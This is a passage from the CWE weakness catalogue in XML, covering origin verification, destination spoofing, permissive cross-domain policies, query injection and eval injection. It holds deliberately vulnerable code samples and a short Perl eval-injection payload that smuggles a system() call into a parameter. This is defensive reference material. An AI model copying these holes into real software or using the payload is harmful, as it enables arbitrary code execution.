         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_ID>CODE</Entry_ID>
               <Entry_Name>Code Evaluation and Injection</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="242"/>
            <Related_Attack_Pattern CAPEC_ID="35"/>
            <Related_Attack_Pattern CAPEC_ID="77"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 3: Web-Client Related Vulnerabilities (XSS).&#34; Page 63"/>
         </References>
         <Notes>
            <Note Type="Research Gap">Many of these weaknesses are under-studied and under-researched, and terminology is not sufficiently precise.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="940" Name="Improper Verification of Source of a Communication Channel" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software establishes a communication channel to handle an incoming request that has been initiated by an actor, but it does not properly verify that the request is coming from the expected origin.</Description>
         <Extended_Description>When an attacker can successfully establish a communication channel from an untrusted origin, the attacker may be able to gain privileges and access unexpected functionality.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="923" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="923" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
            <Paradigm Name="Mobile" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Other</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Varies by Context</Impact>
               <Note>An attacker can access any functionality that is inadvertently accessible to the source.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Use a mechanism that can validate the identity of the source, such as a certificate, and validate the integrity of data to ensure that it cannot be modified in transit using a man-in-the-middle attack.</xhtml:p>
                  <xhtml:p>When designing functionality of actions in the URL scheme, consider whether the action should be accessible to all mobile applications, or if a whitelist of applications to interface with is appropriate.</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-112">
               <Intro_Text>This Android application will remove a user account when it receives an intent to do so:</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>IntentFilter filter = new IntentFilter("com.example.RemoveUser");<xhtml:br/>MyReceiver receiver = new MyReceiver();<xhtml:br/>registerReceiver(receiver, filter);<xhtml:br/>
                     <xhtml:br/>public class DeleteReceiver extends BroadcastReceiver {<xhtml:div style="margin-left:10px;">@Override<xhtml:br/>public void onReceive(Context context, Intent intent) {<xhtml:div style="margin-left:10px;">int userID = intent.getIntExtra("userID");<xhtml:br/>destroyUserData(userID);</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This application does not check the origin of the intent, thus allowing any malicious application to remove a user. Always check the origin of an intent, or create a whitelist of trusted applications using the manifest.xml file.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-109">
               <Intro_Text>These Android and iOS applications intercept URL loading within a WebView and perform special actions if a particular URL scheme is used, thus allowing the Javascript within the WebView to communicate with the application:</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i>// Android</xhtml:i>
                     <xhtml:br/>@Override<xhtml:br/>public boolean shouldOverrideUrlLoading(WebView view, String url){<xhtml:div style="margin-left:10px;">
                        <xhtml:div>if (url.substring(0,14).equalsIgnoreCase("examplescheme:")){<xhtml:div style="margin-left:10px;">if(url.substring(14,25).equalsIgnoreCase("getUserInfo")){<xhtml:div style="margin-left:10px;">writeDataToView(view, UserData);<xhtml:br/>return false;</xhtml:div>}<xhtml:br/>else{<xhtml:div style="margin-left:10px;">return true;</xhtml:div>}</xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="bad" Language="Objective-C">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i>// iOS</xhtml:i>
                     <xhtml:br/>-(BOOL) webView:(UIWebView *)exWebView shouldStartLoadWithRequest:(NSURLRequest *)exRequest navigationType:(UIWebViewNavigationType)exNavigationType<xhtml:br/>{<xhtml:div style="margin-left:10px;">
                        <xhtml:div>NSURL *URL = [exRequest URL];<xhtml:br/>if ([[URL scheme] isEqualToString:@"exampleScheme"])<xhtml:br/>{<xhtml:div style="margin-left:10px;">
                              <xhtml:div>NSString *functionString = [URL resourceSpecifier];<xhtml:br/>if ([functionString hasPrefix:@"specialFunction"])<xhtml:br/>{<xhtml:div style="margin-left:10px;">
                                    <xhtml:div>
                                       <xhtml:br/>
                                       <xhtml:i>// Make data available back in webview.</xhtml:i>
                                       <xhtml:br/>UIWebView *webView = [self writeDataToView:[URL query]];</xhtml:div>
                                 </xhtml:div>}<xhtml:br/>return NO;</xhtml:div>
                           </xhtml:div>}<xhtml:br/>return YES;</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>A call into native code can then be initiated by passing parameters within the URL:</Body_Text>
               <Example_Code Nature="attack" Language="JavaScript">
                  <xhtml:div>window.location = examplescheme://method?parameter=value</xhtml:div>
               </Example_Code>
               <Body_Text>Because the application does not check the source, a malicious website loaded within this WebView has the same access to the API as a trusted site.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2000-1218</Reference>
               <Description>DNS server can accept DNS updates from hosts that it did not query, leading to cache poisoning</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-1218</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0877</Reference>
               <Description>DNS server can accept DNS updates from hosts that it did not query, leading to cache poisoning</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-0877</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1452</Reference>
               <Description>DNS server caches glue records received from non-delegated name servers</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1452</Link>
            </Observed_Example>
         </Observed_Examples>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="594"/>
            <Related_Attack_Pattern CAPEC_ID="595"/>
            <Related_Attack_Pattern CAPEC_ID="596"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-324"/>
         </References>
         <Notes>
            <Note Type="Relationship">While many access control issues involve authenticating the user, this weakness is more about authenticating the actual source of the communication channel itself; there might not be any "user" in such cases.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="941" Name="Incorrectly Specified Destination in a Communication Channel" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software creates a communication channel to initiate an outgoing request to an actor, but it does not correctly specify the intended destination for that actor.</Description>
         <Extended_Description>
            <xhtml:p>Attackers at the destination may be able to spoof trusted servers to steal data or cause a denial of service.</xhtml:p>
            <xhtml:p>There are at least two distinct weaknesses that can cause the software to communicate with an unintended destination:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:ul>
                  <xhtml:li>If the software allows an attacker to control which destination is specified, then the attacker can cause it to connect to an untrusted or malicious destination. For example, because UDP is a connectionless protocol, UDP packets can be spoofed by specifying a false source address in the packet; when the server receives the packet and sends a reply, it will specify a destination by using the source of the incoming packet - i.e., the false source. The server can then be tricked into sending traffic to the wrong host, which is effective for hiding the real source of an attack and for conducting a distributed denial of service (DDoS). As another example, server-side request forgery (SSRF) and XML External Entity (XXE) can be used to trick a server into making outgoing requests to hosts that cannot be directly accessed by the attacker due to firewall restrictions.</xhtml:li>
                  <xhtml:li>If the software incorrectly specifies the destination, then an attacker who can control this destination might be able to spoof trusted servers. While the most common occurrence is likely due to misconfiguration by an administrator, this can be resultant from other weaknesses. For example, the software might incorrectly parse an e-mail or IP address and send sensitive data to an unintended destination. As another example, an Android application may use a "sticky broadcast" to communicate with a receiver for a particular application, but since sticky broadcasts can be processed by *any* receiver, this can allow a malicious application to access restricted data that was only intended for a different application.</xhtml:li>
               </xhtml:ul>
            </xhtml:div>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="923" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="923" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="406" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
            <Paradigm Name="Mobile" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-113">
               <Intro_Text>This code listens on a port for DNS requests and sends the result to the requesting address.</Intro_Text>
               <Example_Code Nature="bad" Language="Python">
                  <xhtml:div>sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<xhtml:br/>sock.bind( (UDP_IP,UDP_PORT) )<xhtml:br/>while true:<xhtml:div style="margin-left:10px;">
                        <xhtml:div>data = sock.recvfrom(1024)<xhtml:br/>if not data:<xhtml:div style="margin-left:10px;">break</xhtml:div>
                           <xhtml:br/>(requestIP, nameToResolve) = parseUDPpacket(data)<xhtml:br/>record = resolveName(nameToResolve)<xhtml:br/>sendResponse(requestIP,record)</xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>This code sends a DNS record to a requesting IP address. UDP allows the source IP address to be easily changed ('spoofed'), thus allowing an attacker to redirect responses to a target, which may be then be overwhelmed by the network traffic.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2013-5211</Reference>
               <Description>composite: NTP feature generates large responses (high amplification factor) with spoofed UDP source addresses.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-5211</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-1999-0513</Reference>
               <Description>Classic "Smurf" attack, using spoofed ICMP packets to broadcast addresses.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0513</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-1999-1379</Reference>
               <Description>DNS query with spoofed source address causes more traffic to be returned to spoofed address than was sent by the attacker.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1379</Link>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference External_Reference_ID="REF-941"/>
            <Reference External_Reference_ID="REF-942"/>
         </References>
         <Notes>
            <Note Type="Maintenance">This entry will be made more comprehensive in later CWE versions.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="942" Name="Overly Permissive Cross-domain Whitelist" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The software uses a cross-domain policy file that includes domains that should not be trusted.</Description>
         <Extended_Description>
            <xhtml:p>A cross-domain policy file ("crossdomain.xml" in Flash and "clientaccesspolicy.xml" in Silverlight) defines a whitelist of domains from which a server is allowed to make cross-domain requests. When making a cross-domain request, the Flash or Silverlight client will first look for the policy file on the target server. If it is found, and the domain hosting the application is explicitly allowed to make requests, the request is made.</xhtml:p>
            <xhtml:p>Therefore, if a cross-domain policy file includes domains that should not be trusted, such as when using wildcards, then the application could be attacked by these untrusted domains.</xhtml:p>
            <xhtml:p>An overly permissive policy file allows many of the same attacks seen in Cross-Site Scripting (CWE-79). Once the user has executed a malicious Flash or Silverlight application, they are vulnerable to a variety of attacks. The attacker could transfer private information, such as cookies that may include session information, from the victim's machine to the attacker. The attacker could send malicious requests to a web site on behalf of the victim, which could be especially dangerous to the site if the victim has administrator privileges to manage that site.</xhtml:p>
            <xhtml:p>In many cases, the attack can be launched without the victim even being aware of it.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="183" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="668" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
            <Paradigm Name="Web Based" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Scope>Access Control</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Read Application Data</Impact>
               <Impact>Varies by Context</Impact>
               <Note>An attacker may be able to bypass the web browser's same-origin policy. An attacker can exploit the weakness to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirecting the user to some other page or site, running ActiveX controls (under Microsoft Internet Explorer) from sites that a user perceives as trustworthy, and modifying presentation of content.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>Avoid using wildcards in the cross-domain policy file. Any domain matching the wildcard expression will be implicitly trusted, and can perform two-way interaction with the target server.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>For Flash, modify crossdomain.xml to use meta-policy options such as 'master-only' or 'none' to reduce the possibility of an attacker planting extraneous cross-domain policy files on a server.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>For Flash, modify crossdomain.xml to use meta-policy options such as 'master-only' or 'none' to reduce the possibility of an attacker planting extraneous cross-domain policy files on a server.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>These cross-domain policy files mean to allow Flash and Silverlight applications hosted on other domains to access its data:</Intro_Text>
               <Body_Text>Flash crossdomain.xml :</Body_Text>
               <Example_Code Nature="bad" Language="XML">
                  <xhtml:div>&lt;cross-domain-policy xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"<xhtml:br/>xsi:noNamespaceSchemaLocation="http://www.adobe.com/xml/schemas/PolicyFile.xsd"&gt;<xhtml:br/>&lt;allow-access-from domain="*.example.com"/&gt;<xhtml:br/>&lt;allow-access-from domain="*"/&gt;<xhtml:br/>&lt;/cross-domain-policy&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>Silverlight clientaccesspolicy.xml :</Body_Text>
               <Example_Code Nature="bad" Language="XML">
                  <xhtml:div>&lt;?xml version="1.0" encoding="utf-8"?&gt;<xhtml:br/>&lt;access-policy&gt;<xhtml:br/>&lt;cross-domain-access&gt;<xhtml:br/>&lt;policy&gt;<xhtml:br/>&lt;allow-from http-request-headers="SOAPAction"&gt;<xhtml:br/>&lt;domain uri="*"/&gt;<xhtml:br/>&lt;/allow-from&gt;<xhtml:br/>&lt;grant-to&gt;<xhtml:br/>&lt;resource path="/" include-subpaths="true"/&gt;<xhtml:br/>&lt;/grant-to&gt;<xhtml:br/>&lt;/policy&gt;<xhtml:br/>&lt;/cross-domain-access&gt;<xhtml:br/>&lt;/access-policy&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>These entries are far too permissive, allowing any Flash or Silverlight application to send requests. A malicious application hosted on any other web site will be able to send requests on behalf of any user tricked into executing it.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2012-2292</Reference>
               <Description>Product has a Silverlight cross-domain policy that does not restrict access to another application, which allows remote attackers to bypass the Same Origin Policy.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2292</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2014-2049</Reference>
               <Description>The default Flash Cross Domain policies in a product allows remote attackers to access user files.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-2049</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-6243</Reference>
               <Description>Chain: Adobe Flash Player does not sufficiently restrict the interpretation and usage of cross-domain policy files, which makes it easier for remote attackers to conduct cross-domain and cross-site scripting (XSS) attacks.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6243</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4822</Reference>
               <Description>Chain: Adobe Flash Player and earlier does not properly interpret policy files, which allows remote attackers to bypass a non-root domain policy.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4822</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-3636</Reference>
               <Description>Chain: Adobe Flash Player does not properly handle unspecified encodings during the parsing of a cross-domain policy file, which allows remote web servers to bypass intended access restrictions via unknown vectors.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3636</Link>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference External_Reference_ID="REF-943"/>
            <Reference External_Reference_ID="REF-944"/>
            <Reference External_Reference_ID="REF-945"/>
            <Reference External_Reference_ID="REF-946"/>
            <Reference External_Reference_ID="REF-947"/>
         </References>
         
      </Weakness>
      <Weakness ID="943" Name="Improper Neutralization of Special Elements in Data Query Logic" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>The application generates a query intended to access or manipulate data in a data store such as a database, but it does not neutralize or incorrectly neutralizes special elements that can modify the intended logic of the query.</Description>
         <Extended_Description>
            <xhtml:p>Depending on the capabilities of the query language, an attacker could inject additional logic into the query to:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:ul>
                  <xhtml:li>Modify the intended selection criteria, thus changing which data entities (e.g., records) are returned, modified, or otherwise manipulated</xhtml:li>
                  <xhtml:li>Append additional commands to the query</xhtml:li>
                  <xhtml:li>Return more entities than intended</xhtml:li>
                  <xhtml:li>Return fewer entities than intended</xhtml:li>
                  <xhtml:li>Cause entities to be sorted in an unexpected way</xhtml:li>
               </xhtml:ul>
            </xhtml:div>
            <xhtml:p>The ability to execute additional commands or change which entities are returned has obvious risks. But when the application logic depends on the order or number of entities, this can also lead to vulnerabilities. For example, if the application query expects to return only one entity that specifies an administrative user, but an attacker can change which entities are returned, this could cause the logic to return information for a regular user and incorrectly assume that the user has administrative privileges.</xhtml:p>
            <xhtml:p>While this weakness is most commonly associated with SQL injection, there are many other query languages that are also subject to injection attacks, including HTSQL, LDAP, DQL, XQuery, Xpath, and "NoSQL" languages.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
               <Impact>Varies by Context</Impact>
            </Consequence>
         </Common_Consequences>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2014-2503</Reference>
               <Description>Injection using Documentum Query Language (DQL)</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-2503</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2014-2508</Reference>
               <Description>Injection using Documentum Query Language (DQL)</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-2508</Link>
            </Observed_Example>
         </Observed_Examples>
         <Notes>
            <Note Type="Relationship">It could be argued that data query languages are effectively a command language - albeit with a limited set of commands - and thus any query-language injection issue could be treated as a child of CWE-74. However, CWE-943 is intended to better organize query-oriented issues to separate them from fully-functioning programming languages, and also to provide a more precise identifier for the many query languages that do not have their own CWE identifier.</Note>
            <Note Type="Maintenance">This entry will be made more comprehensive in future CWE versions.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="95" Name="Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes code syntax before using the input in a dynamic evaluation call (e.g. "eval").</Description>
         <Extended_Description>This may allow an attacker to execute arbitrary code, or at least modify what code can be executed.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="94" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="94" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Name="Java" Prevalence="Undetermined"/>
            <Language Name="JavaScript" Prevalence="Undetermined"/>
            <Language Name="Python" Prevalence="Undetermined"/>
            <Language Name="Perl" Prevalence="Undetermined"/>
            <Language Name="PHP" Prevalence="Undetermined"/>
            <Language Name="Ruby" Prevalence="Undetermined"/>
            <Language Class="Interpreted" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>This weakness is prevalent in handler/dispatch procedures that might want to invoke a large number of functions, or set a large number of variables.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Files or Directories</Impact>
               <Impact>Read Application Data</Impact>
               <Note>The injected code could access restricted data / files.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>In some cases, injectable code controls authentication; this may lead to a remote vulnerability.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>Injected code can access resources that the attacker is directly prevented from accessing.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Scope>Other</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>Code injection attacks can lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing. Additionally, code injection can often result in the execution of arbitrary code.</Note>
            </Consequence>
            <Consequence>
               <Scope>Non-Repudiation</Scope>
               <Impact>Hide Activities</Impact>
               <Note>Often the actions performed by injected control code are unlogged.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Description>If possible, refactor your code so that it does not need to use eval() at all.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180, CWE-181). Make sure that your application does not inadvertently decode the same input twice (CWE-174). Such errors could be used to bypass whitelist schemes by introducing dangerous inputs after they have been checked. Use libraries such as the OWASP ESAPI Canonicalization control.</xhtml:p>
                  <xhtml:p>Consider performing repeated canonicalization until your input does not change any more. This will avoid double-decoding and similar scenarios, but it might inadvertently modify inputs that are allowed to contain properly-encoded dangerous content.</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-31">
               <Intro_Text>edit-config.pl: This CGI script is used to modify settings in a configuration file.</Intro_Text>
               <Example_Code Nature="bad" Language="Perl">
                  <xhtml:div>use CGI qw(:standard);<xhtml:br/>
                     <xhtml:br/>sub config_file_add_key {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>my ($fname, $key, $arg) = @_;<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i># code to add a field/key to a file goes here</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>}<xhtml:br/>
                     <xhtml:br/>sub config_file_set_key {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>my ($fname, $key, $arg) = @_;<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i># code to set key to a particular file goes here</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>}<xhtml:br/>
                     <xhtml:br/>sub config_file_delete_key {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>my ($fname, $key, $arg) = @_;<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i># code to delete key from a particular file goes here</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>}<xhtml:br/>
                     <xhtml:br/>sub handleConfigAction {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>my ($fname, $action) = @_;<xhtml:br/>my $key = param('key');<xhtml:br/>my $val = param('val');<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i># this is super-efficient code, especially if you have to invoke</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i># any one of dozens of different functions!</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>my $code = "config_file_$action_key(\$fname, \$key, \$val);";<xhtml:br/>eval($code);</xhtml:div>
                     </xhtml:div>}<xhtml:br/>
                     <xhtml:br/>$configfile = "/home/cwe/config.txt";<xhtml:br/>print header;<xhtml:br/>if (defined(param('action'))) {<xhtml:div style="margin-left:10px;">handleConfigAction($configfile, param('action'));</xhtml:div>}<xhtml:br/>else {<xhtml:div style="margin-left:10px;">print "No action specified!\n";</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The script intends to take the 'action' parameter and invoke one of a variety of functions based on the value of that parameter - config_file_add_key(), config_file_set_key(), or config_file_delete_key(). It could set up a conditional to invoke each function separately, but eval() is a powerful way of doing the same thing in fewer lines of code, especially when a large number of functions or variables are involved. Unfortunately, in this case, the attacker can provide other values in the action parameter, such as:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>add_key(",","); system("/bin/ls");</xhtml:div>
               </Example_Code>
               <Body_Text>This would produce the following string in handleConfigAction():</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>config_file_add_key(",","); system("/bin/ls");</xhtml:div>
               </Example_Code>
               <Body_Text>Any arbitrary Perl code could be added after the attacker has "closed off" the construction of the original function call, in order to prevent parsing errors from causing the malicious eval() to fail before the attacker's payload is activated. This particular manipulation would fail after the system() call, because the "_key(\$fname, \$key, \$val)" portion of the string would cause an error, but this is irrelevant to the attack because the payload has already been activated.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2008-5071</Reference>
